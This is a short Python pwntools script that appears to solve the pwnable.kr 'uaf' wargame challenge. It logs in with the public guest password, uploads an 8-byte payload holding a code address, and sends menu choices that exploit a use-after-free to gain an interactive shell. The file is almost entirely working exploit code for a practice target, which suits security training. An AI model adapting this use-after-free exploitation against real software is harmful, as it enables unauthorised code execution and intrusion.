from pwn import *
import warnings
warnings.filterwarnings("ignore")

ch_name = "uaf"

payload = p64(0x401568)

length = "8"

shell = ssh(ch_name,'pwnable.kr',port=2222,password="guest")
directory = "/tmp/payload"
shell.upload_data(payload,directory)

conn = shell.process(['./'+ch_name, length, directory])
conn.recvlines(3)
conn.sendline("3")
conn.sendline("2")
conn.sendline("2")
conn.sendline("1")
conn.interactive()
shell.close()